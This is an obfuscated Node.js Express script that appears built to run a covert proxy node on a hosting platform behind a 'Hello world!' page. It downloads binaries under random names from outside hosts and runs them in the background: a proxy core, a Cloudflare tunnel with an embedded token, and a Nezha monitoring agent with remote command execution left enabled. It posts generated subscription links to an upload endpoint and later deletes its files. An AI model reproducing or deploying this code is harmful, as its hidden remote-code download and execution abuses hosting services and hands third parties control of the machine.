const _0xf656cb=_0x3298;(function(_0x5e3b8b,_0x3e537c){const _0x5487ed=_0x3298,_0x2b50c8=_0x5e3b8b();while(!![]){try{const _0x41935d=-parseInt(_0x5487ed(0xf5))/0x1+-parseInt(_0x5487ed(0xf4))/0x2+-parseInt(_0x5487ed(0x199))/0x3+parseInt(_0x5487ed(0x19f))/0x4*(-parseInt(_0x5487ed(0x137))/0x5)+-parseInt(_0x5487ed(0x110))/0x6*(parseInt(_0x5487ed(0x156))/0x7)+parseInt(_0x5487ed(0x17d))/0x8*(parseInt(_0x5487ed(0x16a))/0x9)+parseInt(_0x5487ed(0x117))/0xa*(parseInt(_0x5487ed(0x170))/0xb);if(_0x41935d===_0x3e537c)break;else _0x2b50c8['push'](_0x2b50c8['shift']());}catch(_0x1ae996){_0x2b50c8['push'](_0x2b50c8['shift']());}}}(_0x1ec5,0xc355c));const express=require(_0xf656cb(0x15e)),app=express(),axios=require(_0xf656cb(0x129)),os=require('os'),fs=require('fs'),path=require(_0xf656cb(0x192)),{promisify}=require(_0xf656cb(0x12a)),exec=promisify(require(_0xf656cb(0x10a))[_0xf656cb(0x188)]),{execSync}=require(_0xf656cb(0x10a)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0xf656cb(0x177)][_0xf656cb(0x197)]||'',AUTO_ACCESS=process[_0xf656cb(0x177)][_0xf656cb(0xfc)]||![],FILE_PATH=process['env'][_0xf656cb(0xfa)]||_0xf656cb(0x100),SUB_PATH=process[_0xf656cb(0x177)][_0xf656cb(0x133)]||_0xf656cb(0x120),PORT=process['env']['SERVER_PORT']||process[_0xf656cb(0x177)][_0xf656cb(0x108)]||0xbb8,UUID=process[_0xf656cb(0x177)][_0xf656cb(0x154)]||'7e5f4243-fcf9-432b-8861-7f231f0cec09',NEZHA_SERVER=process['env'][_0xf656cb(0x185)]||'',NEZHA_PORT=process[_0xf656cb(0x177)][_0xf656cb(0xec)]||'',NEZHA_KEY=process['env'][_0xf656cb(0x158)]||'',ARGO_DOMAIN=process[_0xf656cb(0x177)]['ARGO_DOMAIN']||'chunjing99.220009.xyz',ARGO_AUTH=process['env'][_0xf656cb(0x105)]||_0xf656cb(0x19a),ARGO_PORT=process['env'][_0xf656cb(0x152)]||0x1f41,CFIP=process['env'][_0xf656cb(0x114)]||_0xf656cb(0xf8),CFPORT=process[_0xf656cb(0x177)][_0xf656cb(0x121)]||0x1bb,NAME=process[_0xf656cb(0x177)][_0xf656cb(0x176)]||_0xf656cb(0x157);!fs['existsSync'](FILE_PATH)?(fs[_0xf656cb(0x123)](FILE_PATH),console[_0xf656cb(0x16b)](FILE_PATH+_0xf656cb(0x17a))):console['log'](FILE_PATH+_0xf656cb(0x168));function _0x1ec5(){const _0x5ba6b3=['Error\x20downloading\x20files:','FILE_PATH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','AUTO_ACCESS','automatic\x20access\x20task\x20added\x20successfully','all','readdirSync','./tmp','map','includes','isFile','arch','ARGO_AUTH','amd','direct','PORT','--tls','child_process','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20running\x20error:\x20','arm64','\x20>/dev/null\x202>&1\x20&','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','45228tNMzSG','forEach','/trojan-argo','arm','CFIP','quic','https://arm64.ssss.nyc.mn/agent','70vxjxpN','\x20failed:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http','/vless-argo','match','finish','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sub','CFPORT','nohup\x20','mkdirSync','post','freedom','list.txt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','base64','axios','util','/api/delete-nodes','unlinkSync','App\x20is\x20running','\x0a\x20\x20\x20\x20','application/json','8443','tunnel.json','false','SUB_PATH','none','config.yaml','\x20>/dev/null\x202>&1','8615iHcDhS','&fp=firefox&type=ws&host=','\x20is\x20running','aarch64','response','close','2096','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','join','message','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','\x0a\x20\x20\x0avmess://','random','trim','https+local://8.8.8.8/dns-query','stringify','TunnelSecret','length','pipe','Download\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','filter','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','substring','abcdefghijklmnopqrstuvwxyz','tls','ARGO_PORT','status','UUID','2087','203NTxhOg','chunjing_ip','NEZHA_KEY','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','toString','catch','https://amd64.ssss.nyc.mn/agent','tcp','express','boot.log','statSync','from','ArgoDomain:','https://arm64.ssss.nyc.mn/v1','pop','/vmess-argo','&path=%2Fvless-argo%3Fed%3D2560#','\x20-p\x20','\x20already\x20exists','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','13501647kOAKpG','log','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileUrl','/vmess-argo?ed=2560','.exe\x20>\x20nul\x202>&1','4371587eoydjE','https://oooo.serv00.net/add-url','clear','createWriteStream','data','xtls-rprx-vision','NAME','env','del\x20/f\x20/q\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20is\x20created','Unhandled\x20error\x20in\x20startserver:','/api/add-subscriptions','8AHiDpg','utf-8','unshift','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','basename','/dev/null','Hello\x20world!','127.0.0.1','NEZHA_SERVER','firefox','win32','exec','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','platform','vmess','Skipping\x20adding\x20automatic\x20access\x20task','https://amd64.ssss.nyc.mn/bot','true','vless','test','get','path','writeFileSync','send','2053','https://arm64.ssss.nyc.mn/web','PROJECT_URL','existsSync','4403694DOwPRU','eyJhIjoiZjkwMTM3YjczNjY1OTZlZmE5ODFjMDk3YmZkNzA2ZmEiLCJ0IjoiMDYzM2YxY2MtMDkyYS00ODZkLTgwYTctZDVmNDE5ZjA5Y2ViIiwicyI6Ik5XTXhORFU0WWpRdFl6STFOeTAwTUdOaExUbGlObU10TWpJNVlqTmxPVFJrT1RrNSJ9','443','sub.txt','charAt','pkill\x20-f\x20\x22[','808wnvGvJ','error','/api/add-nodes','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','NEZHA_PORT','readFileSync','push','\x0a\x20\x20\x0atrojan://','Subscription\x20uploaded\x20successfully','\x0a\x20\x20credentials-file:\x20','unlink','blackhole','1945664SQXIMw','474632ESMJRH','config.json','split','cdns.doon.eu.org'];_0x1ec5=function(){return _0x5ba6b3;};return _0x1ec5();}function generateRandomName(){const _0x203b8f=_0xf656cb,_0x53fa2c=_0x203b8f(0x150);let _0x2780a9='';for(let _0x1fa6b8=0x0;_0x1fa6b8<0x6;_0x1fa6b8++){_0x2780a9+=_0x53fa2c[_0x203b8f(0x19d)](Math['floor'](Math[_0x203b8f(0x144)]()*_0x53fa2c[_0x203b8f(0x149)]));}return _0x2780a9;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xf656cb(0x13f)](FILE_PATH,npmName),phpPath=path[_0xf656cb(0x13f)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xf656cb(0x13f)](FILE_PATH,botName),subPath=path[_0xf656cb(0x13f)](FILE_PATH,_0xf656cb(0x19c)),listPath=path[_0xf656cb(0x13f)](FILE_PATH,_0xf656cb(0x126)),bootLogPath=path['join'](FILE_PATH,_0xf656cb(0x15f)),configPath=path[_0xf656cb(0x13f)](FILE_PATH,_0xf656cb(0xf6));function deleteNodes(){const _0x3d1865=_0xf656cb;try{if(!UPLOAD_URL)return;if(!fs[_0x3d1865(0x198)](subPath))return;let _0x39289e;try{_0x39289e=fs[_0x3d1865(0xed)](subPath,_0x3d1865(0x17e));}catch{return null;}const _0x4d40f8=Buffer[_0x3d1865(0x161)](_0x39289e,_0x3d1865(0x128))[_0x3d1865(0x15a)](_0x3d1865(0x17e)),_0x26883d=_0x4d40f8[_0x3d1865(0xf7)]('\x0a')[_0x3d1865(0x14d)](_0x51384b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d1865(0x190)](_0x51384b));if(_0x26883d['length']===0x0)return;return axios[_0x3d1865(0x124)](UPLOAD_URL+_0x3d1865(0x12b),JSON['stringify']({'nodes':_0x26883d}),{'headers':{'Content-Type':_0x3d1865(0x12f)}})[_0x3d1865(0x15b)](_0x219497=>{return null;}),null;}catch(_0x213a68){return null;}}function cleanupOldFiles(){const _0x3f60d4=_0xf656cb;try{const _0x316a95=fs[_0x3f60d4(0xff)](FILE_PATH);_0x316a95['forEach'](_0x202a38=>{const _0x5dd03c=_0x3f60d4,_0x773e4e=path[_0x5dd03c(0x13f)](FILE_PATH,_0x202a38);try{const _0x75ec45=fs[_0x5dd03c(0x160)](_0x773e4e);_0x75ec45[_0x5dd03c(0x103)]()&&fs[_0x5dd03c(0x12c)](_0x773e4e);}catch(_0x4b5dbb){}});}catch(_0x52393d){}}app[_0xf656cb(0x191)]('/',function(_0x149cf8,_0x38d907){const _0x277d2b=_0xf656cb;_0x38d907[_0x277d2b(0x194)](_0x277d2b(0x183));});async function generateConfig(){const _0x24f944=_0xf656cb,_0x13f1de={'log':{'access':_0x24f944(0x182),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x24f944(0x18f),'settings':{'clients':[{'id':UUID,'flow':_0x24f944(0x175)}],'decryption':_0x24f944(0x134),'fallbacks':[{'dest':0xbb9},{'path':_0x24f944(0x11b),'dest':0xbba},{'path':_0x24f944(0x165),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x24f944(0x184),'protocol':_0x24f944(0x18f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x24f944(0x15d),'security':'none'}},{'port':0xbba,'listen':_0x24f944(0x184),'protocol':_0x24f944(0x18f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x24f944(0x134),'wsSettings':{'path':_0x24f944(0x11b)}},'sniffing':{'enabled':!![],'destOverride':[_0x24f944(0x11a),'tls',_0x24f944(0x115)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x24f944(0x184),'protocol':_0x24f944(0x18b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24f944(0x165)}},'sniffing':{'enabled':!![],'destOverride':[_0x24f944(0x11a),_0x24f944(0x151),_0x24f944(0x115)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24f944(0x134),'wsSettings':{'path':_0x24f944(0x112)}},'sniffing':{'enabled':!![],'destOverride':[_0x24f944(0x11a),_0x24f944(0x151),_0x24f944(0x115)],'metadataOnly':![]}}],'dns':{'servers':[_0x24f944(0x146)]},'outbounds':[{'protocol':_0x24f944(0x125),'tag':_0x24f944(0x107)},{'protocol':_0x24f944(0xf3),'tag':'block'}]};fs[_0x24f944(0x193)](path[_0x24f944(0x13f)](FILE_PATH,_0x24f944(0xf6)),JSON[_0x24f944(0x147)](_0x13f1de,null,0x2));}function getSystemArchitecture(){const _0x4e4fff=_0xf656cb,_0x2561c3=os[_0x4e4fff(0x104)]();return _0x2561c3===_0x4e4fff(0x113)||_0x2561c3===_0x4e4fff(0x10d)||_0x2561c3===_0x4e4fff(0x13a)?_0x4e4fff(0x113):_0x4e4fff(0x106);}function downloadFile(_0x34313e,_0x336bbc,_0x298496){const _0x52b811=_0xf656cb,_0x177fe3=_0x34313e;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1faae1=fs[_0x52b811(0x173)](_0x177fe3);axios({'method':'get','url':_0x336bbc,'responseType':'stream'})['then'](_0x47dba6=>{const _0x1f1624=_0x52b811;_0x47dba6[_0x1f1624(0x174)][_0x1f1624(0x14a)](_0x1faae1),_0x1faae1['on'](_0x1f1624(0x11d),()=>{const _0x3797ec=_0x1f1624;_0x1faae1[_0x3797ec(0x13c)](),console['log'](_0x3797ec(0x14b)+path[_0x3797ec(0x181)](_0x177fe3)+'\x20successfully'),_0x298496(null,_0x177fe3);}),_0x1faae1['on'](_0x1f1624(0x1a0),_0x48ffcd=>{const _0x58a063=_0x1f1624;fs[_0x58a063(0xf2)](_0x177fe3,()=>{});const _0xda799=_0x58a063(0x14b)+path[_0x58a063(0x181)](_0x177fe3)+_0x58a063(0x118)+_0x48ffcd[_0x58a063(0x140)];console[_0x58a063(0x1a0)](_0xda799),_0x298496(_0xda799);});})[_0x52b811(0x15b)](_0x2cceb2=>{const _0x2d1b20=_0x52b811,_0x1a5967=_0x2d1b20(0x14b)+path['basename'](_0x177fe3)+_0x2d1b20(0x118)+_0x2cceb2[_0x2d1b20(0x140)];console['error'](_0x1a5967),_0x298496(_0x1a5967);});}async function downloadFilesAndRun(){const _0xdabb83=_0xf656cb,_0x4949bd=getSystemArchitecture(),_0x5af760=getFilesForArchitecture(_0x4949bd);if(_0x5af760['length']===0x0){console[_0xdabb83(0x16b)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x36dff7=_0x5af760[_0xdabb83(0x101)](_0x333fe8=>{return new Promise((_0x30abbb,_0x31e25d)=>{const _0x3239f4=_0x3298;downloadFile(_0x333fe8['fileName'],_0x333fe8[_0x3239f4(0x16d)],(_0xfc6dea,_0x3dcf9f)=>{_0xfc6dea?_0x31e25d(_0xfc6dea):_0x30abbb(_0x3dcf9f);});});});try{await Promise[_0xdabb83(0xfe)](_0x36dff7);}catch(_0x2314a5){console[_0xdabb83(0x1a0)](_0xdabb83(0xf9),_0x2314a5);return;}function _0x5a0c6(_0x292393){const _0x2f4a0c=_0xdabb83,_0x14f09f=0x1fd;_0x292393[_0x2f4a0c(0x111)](_0x33735e=>{const _0x5365be=_0x2f4a0c;fs[_0x5365be(0x198)](_0x33735e)&&fs['chmod'](_0x33735e,_0x14f09f,_0x27f0cc=>{const _0x5842a2=_0x5365be;_0x27f0cc?console[_0x5842a2(0x1a0)]('Empowerment\x20failed\x20for\x20'+_0x33735e+':\x20'+_0x27f0cc):console[_0x5842a2(0x16b)]('Empowerment\x20success\x20for\x20'+_0x33735e+':\x20'+_0x14f09f[_0x5842a2(0x15a)](0x8));});});}const _0x41a555=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5a0c6(_0x41a555);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2db854=NEZHA_SERVER[_0xdabb83(0x102)](':')?NEZHA_SERVER['split'](':')[_0xdabb83(0x164)]():'',_0x4e379c=new Set([_0xdabb83(0x19b),_0xdabb83(0x130),_0xdabb83(0x13d),_0xdabb83(0x155),'2083','2053']),_0x2ab369=_0x4e379c['has'](_0x2db854)?_0xdabb83(0x18e):_0xdabb83(0x132),_0x4bd3aa=_0xdabb83(0x142)+NEZHA_KEY+_0xdabb83(0x11f)+NEZHA_SERVER+_0xdabb83(0x10b)+_0x2ab369+_0xdabb83(0x189)+UUID;fs[_0xdabb83(0x193)](path['join'](FILE_PATH,_0xdabb83(0x135)),_0x4bd3aa);const _0x5ab2ef='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xdabb83(0x127);try{await exec(_0x5ab2ef),console[_0xdabb83(0x16b)](phpName+'\x20is\x20running'),await new Promise(_0x2ee31c=>setTimeout(_0x2ee31c,0x3e8));}catch(_0x4ab76f){console[_0xdabb83(0x1a0)]('php\x20running\x20error:\x20'+_0x4ab76f);}}else{let _0x3fbeaf='';const _0x15b3a9=[_0xdabb83(0x19b),'8443',_0xdabb83(0x13d),_0xdabb83(0x155),'2083',_0xdabb83(0x195)];_0x15b3a9['includes'](NEZHA_PORT)&&(_0x3fbeaf=_0xdabb83(0x109));const _0x3f130b='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xdabb83(0x167)+NEZHA_KEY+'\x20'+_0x3fbeaf+_0xdabb83(0x141);try{await exec(_0x3f130b),console[_0xdabb83(0x16b)](npmName+_0xdabb83(0x139)),await new Promise(_0x5e0a10=>setTimeout(_0x5e0a10,0x3e8));}catch(_0x7afdb){console[_0xdabb83(0x1a0)](_0xdabb83(0x10c)+_0x7afdb);}}}else console['log'](_0xdabb83(0x11e));const _0x1b28a6=_0xdabb83(0x122)+webPath+'\x20-c\x20'+FILE_PATH+_0xdabb83(0xea);try{await exec(_0x1b28a6),console[_0xdabb83(0x16b)](webName+_0xdabb83(0x139)),await new Promise(_0x2249b9=>setTimeout(_0x2249b9,0x3e8));}catch(_0x145deb){console['error']('web\x20running\x20error:\x20'+_0x145deb);}if(fs[_0xdabb83(0x198)](botPath)){let _0x53f9b5;if(ARGO_AUTH[_0xdabb83(0x11c)](/^[A-Z0-9a-z=]{120,250}$/))_0x53f9b5=_0xdabb83(0x119)+ARGO_AUTH;else ARGO_AUTH[_0xdabb83(0x11c)](/TunnelSecret/)?_0x53f9b5=_0xdabb83(0x169)+FILE_PATH+'/tunnel.yml\x20run':_0x53f9b5=_0xdabb83(0x13e)+FILE_PATH+_0xdabb83(0xfb)+ARGO_PORT;try{await exec(_0xdabb83(0x122)+botPath+'\x20'+_0x53f9b5+_0xdabb83(0x10e)),console[_0xdabb83(0x16b)](botName+_0xdabb83(0x139)),await new Promise(_0xec6126=>setTimeout(_0xec6126,0x7d0));}catch(_0x62549c){console[_0xdabb83(0x1a0)](_0xdabb83(0xeb)+_0x62549c);}}await new Promise(_0x1ee8ec=>setTimeout(_0x1ee8ec,0x1388));}function getFilesForArchitecture(_0x449076){const _0x689d78=_0xf656cb;let _0x39b791;_0x449076==='arm'?_0x39b791=[{'fileName':webPath,'fileUrl':_0x689d78(0x196)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x39b791=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x689d78(0x18d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x165109=_0x449076===_0x689d78(0x113)?_0x689d78(0x116):_0x689d78(0x15c);_0x39b791['unshift']({'fileName':npmPath,'fileUrl':_0x165109});}else{const _0x18fe1e=_0x449076===_0x689d78(0x113)?_0x689d78(0x163):'https://amd64.ssss.nyc.mn/v1';_0x39b791[_0x689d78(0x17f)]({'fileName':phpPath,'fileUrl':_0x18fe1e});}}return _0x39b791;}function argoType(){const _0x2283c3=_0xf656cb;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x2283c3(0x180));return;}if(ARGO_AUTH[_0x2283c3(0x102)](_0x2283c3(0x148))){fs['writeFileSync'](path[_0x2283c3(0x13f)](FILE_PATH,_0x2283c3(0x131)),ARGO_AUTH);const _0x5dab76='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2283c3(0xf7)]('\x22')[0xb]+_0x2283c3(0xf1)+path[_0x2283c3(0x13f)](FILE_PATH,_0x2283c3(0x131))+_0x2283c3(0x179)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x2283c3(0x14e);fs[_0x2283c3(0x193)](path[_0x2283c3(0x13f)](FILE_PATH,'tunnel.yml'),_0x5dab76);}else console[_0x2283c3(0x16b)](_0x2283c3(0x159));}argoType();async function extractDomains(){const _0x4f9d77=_0xf656cb;let _0x47b65f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x47b65f=ARGO_DOMAIN,console[_0x4f9d77(0x16b)]('ARGO_DOMAIN:',_0x47b65f),await _0xb5032a(_0x47b65f);else try{const _0x254a1c=fs['readFileSync'](path['join'](FILE_PATH,_0x4f9d77(0x15f)),_0x4f9d77(0x17e)),_0x2989af=_0x254a1c['split']('\x0a'),_0x1e6871=[];_0x2989af[_0x4f9d77(0x111)](_0x140249=>{const _0x5e2329=_0x4f9d77,_0x1f568e=_0x140249['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1f568e){const _0x452c87=_0x1f568e[0x1];_0x1e6871[_0x5e2329(0xee)](_0x452c87);}});if(_0x1e6871['length']>0x0)_0x47b65f=_0x1e6871[0x0],console[_0x4f9d77(0x16b)](_0x4f9d77(0x162),_0x47b65f),await _0xb5032a(_0x47b65f);else{console[_0x4f9d77(0x16b)](_0x4f9d77(0x10f)),fs['unlinkSync'](path[_0x4f9d77(0x13f)](FILE_PATH,'boot.log'));async function _0x208ef4(){const _0x1f476f=_0x4f9d77;try{process[_0x1f476f(0x18a)]===_0x1f476f(0x187)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x1f476f(0x16f)):await exec(_0x1f476f(0x19e)+botName[_0x1f476f(0x19d)](0x0)+']'+botName[_0x1f476f(0x14f)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x527de0){}}_0x208ef4(),await new Promise(_0x56ae7e=>setTimeout(_0x56ae7e,0xbb8));const _0x439d62=_0x4f9d77(0x13e)+FILE_PATH+_0x4f9d77(0xfb)+ARGO_PORT;try{await exec(_0x4f9d77(0x122)+botPath+'\x20'+_0x439d62+_0x4f9d77(0x10e)),console[_0x4f9d77(0x16b)](botName+_0x4f9d77(0x139)),await new Promise(_0x214b52=>setTimeout(_0x214b52,0xbb8)),await extractDomains();}catch(_0x3cd5ba){console[_0x4f9d77(0x1a0)](_0x4f9d77(0xeb)+_0x3cd5ba);}}}catch(_0x414450){console[_0x4f9d77(0x1a0)]('Error\x20reading\x20boot.log:',_0x414450);}async function _0xb5032a(_0x3a4aae){const _0x20350b=_0x4f9d77,_0x44cc77=execSync(_0x20350b(0x14c),{'encoding':_0x20350b(0x17e)}),_0x47e8e4=_0x44cc77[_0x20350b(0x145)](),_0x1ac038=NAME?NAME+'-'+_0x47e8e4:_0x47e8e4;return new Promise(_0x2638f0=>{setTimeout(()=>{const _0x54dfd7=_0x3298,_0x1ece23={'v':'2','ps':''+_0x1ac038,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x54dfd7(0x134),'host':_0x3a4aae,'path':_0x54dfd7(0x16e),'tls':_0x54dfd7(0x151),'sni':_0x3a4aae,'alpn':'','fp':_0x54dfd7(0x186)},_0x1abb45='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3a4aae+_0x54dfd7(0x138)+_0x3a4aae+_0x54dfd7(0x166)+_0x1ac038+_0x54dfd7(0x143)+Buffer['from'](JSON[_0x54dfd7(0x147)](_0x1ece23))[_0x54dfd7(0x15a)](_0x54dfd7(0x128))+_0x54dfd7(0xef)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3a4aae+_0x54dfd7(0x138)+_0x3a4aae+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1ac038+_0x54dfd7(0x12e);console[_0x54dfd7(0x16b)](Buffer['from'](_0x1abb45)[_0x54dfd7(0x15a)]('base64')),fs[_0x54dfd7(0x193)](subPath,Buffer[_0x54dfd7(0x161)](_0x1abb45)['toString'](_0x54dfd7(0x128))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x54dfd7(0x191)]('/'+SUB_PATH,(_0x2d38c0,_0x3e2f58)=>{const _0x5716f2=_0x54dfd7,_0x1e781c=Buffer[_0x5716f2(0x161)](_0x1abb45)[_0x5716f2(0x15a)](_0x5716f2(0x128));_0x3e2f58['set']('Content-Type','text/plain;\x20charset=utf-8'),_0x3e2f58[_0x5716f2(0x194)](_0x1e781c);}),_0x2638f0(_0x1abb45);},0x7d0);});}}async function uploadNodes(){const _0x4d08dd=_0xf656cb;if(UPLOAD_URL&&PROJECT_URL){const _0x35ec7d=PROJECT_URL+'/'+SUB_PATH,_0x197da4={'subscription':[_0x35ec7d]};try{const _0x2f762b=await axios[_0x4d08dd(0x124)](UPLOAD_URL+_0x4d08dd(0x17c),_0x197da4,{'headers':{'Content-Type':_0x4d08dd(0x12f)}});return _0x2f762b&&_0x2f762b[_0x4d08dd(0x153)]===0xc8?(console[_0x4d08dd(0x16b)](_0x4d08dd(0xf0)),_0x2f762b):null;}catch(_0x539ee7){if(_0x539ee7['response']){if(_0x539ee7[_0x4d08dd(0x13b)][_0x4d08dd(0x153)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4d08dd(0x198)](listPath))return;const _0x75fcf1=fs[_0x4d08dd(0xed)](listPath,_0x4d08dd(0x17e)),_0x37f1b9=_0x75fcf1[_0x4d08dd(0xf7)]('\x0a')[_0x4d08dd(0x14d)](_0x227807=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d08dd(0x190)](_0x227807));if(_0x37f1b9['length']===0x0)return;const _0x27d640=JSON[_0x4d08dd(0x147)]({'nodes':_0x37f1b9});try{const _0x3814bb=await axios['post'](UPLOAD_URL+_0x4d08dd(0xe9),_0x27d640,{'headers':{'Content-Type':_0x4d08dd(0x12f)}});return _0x3814bb&&_0x3814bb['status']===0xc8?(console[_0x4d08dd(0x16b)]('Nodes\x20uploaded\x20successfully'),_0x3814bb):null;}catch(_0x35e33e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x221b62=_0x3298,_0x5c0de4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5c0de4[_0x221b62(0xee)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5c0de4[_0x221b62(0xee)](phpPath);process[_0x221b62(0x18a)]===_0x221b62(0x187)?exec(_0x221b62(0x178)+_0x5c0de4[_0x221b62(0x13f)]('\x20')+'\x20>\x20nul\x202>&1',_0x21aa75=>{const _0x577241=_0x221b62;console[_0x577241(0x172)](),console[_0x577241(0x16b)](_0x577241(0x12d)),console[_0x577241(0x16b)](_0x577241(0x16c));}):exec('rm\x20-rf\x20'+_0x5c0de4[_0x221b62(0x13f)]('\x20')+_0x221b62(0x136),_0x29d271=>{const _0x2d3f0b=_0x221b62;console[_0x2d3f0b(0x172)](),console[_0x2d3f0b(0x16b)](_0x2d3f0b(0x12d)),console[_0x2d3f0b(0x16b)](_0x2d3f0b(0x16c));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x45f628=_0xf656cb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x45f628(0x16b)](_0x45f628(0x18c));return;}try{const _0x35d187=await axios[_0x45f628(0x124)](_0x45f628(0x171),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x45f628(0x12f)}});return console[_0x45f628(0x16b)](_0x45f628(0xfd)),_0x35d187;}catch(_0x3b3aa2){return console[_0x45f628(0x1a0)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3b3aa2[_0x45f628(0x140)]),null;}}async function startserver(){const _0x24e0ae=_0xf656cb;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3cb97e){console[_0x24e0ae(0x1a0)]('Error\x20in\x20startserver:',_0x3cb97e);}}function _0x3298(_0x270704,_0x5edf8d){_0x270704=_0x270704-0xe9;const _0x1ec592=_0x1ec5();let _0x329814=_0x1ec592[_0x270704];return _0x329814;}startserver()['catch'](_0x7b567e=>{const _0x180208=_0xf656cb;console[_0x180208(0x1a0)](_0x180208(0x17b),_0x7b567e);}),app['listen'](PORT,()=>console[_0xf656cb(0x16b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
